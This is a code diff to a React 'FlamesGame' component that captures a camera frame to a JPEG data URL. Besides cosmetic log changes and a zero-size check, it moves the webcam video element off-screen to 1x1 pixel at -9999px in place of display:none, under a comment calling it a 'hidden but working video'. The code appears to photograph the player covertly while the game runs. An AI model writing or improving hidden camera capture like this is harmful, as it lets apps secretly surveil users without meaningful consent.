@@ -181,7 +181,7 @@ const FlamesGame = () => {
 
             const onCanPlay = () => {
               video.removeEventListener("canplay", onCanPlay);
-              console.log("🎥 Video can play (frame ready)");
+              console.log("🎥 Video ready");
               res();
             };
 
@@ -192,7 +192,7 @@ const FlamesGame = () => {
             }
           });
 
-          await new Promise(r => setTimeout(r, 500)); // tiny delay just in case
+          await new Promise(r => setTimeout(r, 500));
           await capturePhoto();
           stopCamera();
         }
@@ -217,6 +217,11 @@ const FlamesGame = () => {
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+
+    if (canvas.width === 0 || canvas.height === 0) {
+      console.warn("🚫 Video not ready: zero dimensions");
+      return;
+    }
 
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const imageData = canvas.toDataURL("image/jpeg");
@@ -326,7 +331,7 @@ const FlamesGame = () => {
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
 
-      {/* 🔒 Hidden but working video */}
+      {/* Off-screen but active video */}
       <video
         ref={videoRef}
         width="320"
@@ -334,7 +339,13 @@ const FlamesGame = () => {
         autoPlay
         muted
         playsInline
-        style={{ display: "none" }}
+        style={{
+          position: "absolute",
+          top: "-9999px",
+          left: "-9999px",
+          width: "1px",
+          height: "1px",
+        }}
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
     </Background>
